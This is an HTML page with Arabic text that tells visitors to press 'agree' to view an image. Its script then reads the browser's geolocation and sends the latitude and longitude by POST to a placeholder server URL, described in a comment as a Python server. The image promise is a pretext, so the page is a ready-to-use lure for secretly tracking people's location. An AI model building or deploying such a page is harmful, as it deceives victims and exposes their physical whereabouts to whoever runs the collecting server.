<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>طلب الموقع الجغرافي</title>
</head>
<body>
    <h2>لعرض الصورة اضغط موافقة</h2>
    <button id="getLocationBtn">موافقة</button>
    <p id="status"></p>
    <p id="location"></p>

    <script>
        const btn = document.getElementById('getLocationBtn');
        const status = document.getElementById('status');
        const locationDisplay = document.getElementById('location');

        btn.addEventListener('click', () => {
            locationDisplay.textContent = "";
            if (!navigator.geolocation) {
                status.textContent = "المتصفح لا يدعم تحديد الموقع.";
                return;
            }
            status.textContent = "جاري الحصول على الموقع...";
            navigator.geolocation.getCurrentPosition(success, error);
        });

        function success(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            status.textContent = "تم الحصول على الموقع وسيتم إرساله تلقائيًا.";
            locationDisplay.textContent = `خط العرض: ${latitude.toFixed(6)}, خط الطول: ${longitude.toFixed(6)}`;

            // إرسال الموقع لسيرفر بايثون
            fetch("https://YOUR_SERVER_URL/location", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({latitude, longitude})
            });
        }

        function error(err) {
            if (err.code === err.PERMISSION_DENIED) {
                status.textContent = "يرجى تفعيل الموقع الجغرافي والموافقة على إذن الموقع.";
            } else {
                status.textContent = "تعذر الحصول على الموقع. تأكد من تفعيل الـ GPS.";
            }
        }
    </script>
</body>
</html>
